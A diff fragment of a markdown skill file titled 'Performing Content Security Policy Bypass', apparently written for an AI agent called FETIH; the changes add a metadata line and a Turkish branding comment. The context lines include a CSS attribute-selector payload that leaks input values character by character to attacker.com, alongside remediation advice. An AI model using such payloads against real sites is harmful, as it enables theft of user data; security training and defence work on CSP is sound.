@@ -33,6 +33,7 @@ nist_csf:
 - ID.RA-01
 - PR.DS-10
 - DE.CM-01
+adapted_for: fetih
 ---
 
 # Performing Content Security Policy Bypass
@@ -194,3 +195,10 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 - Migrate from unsafe-inline to strict nonce-based policy
 - Implement strict-dynamic for modern CSP3 browsers
 ```
+
+<!--
+  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
+  Yetkisiz kullanim/kopyalama tespit edilebilir.
+  hash: 0a8447a625c7a053
+-->
+
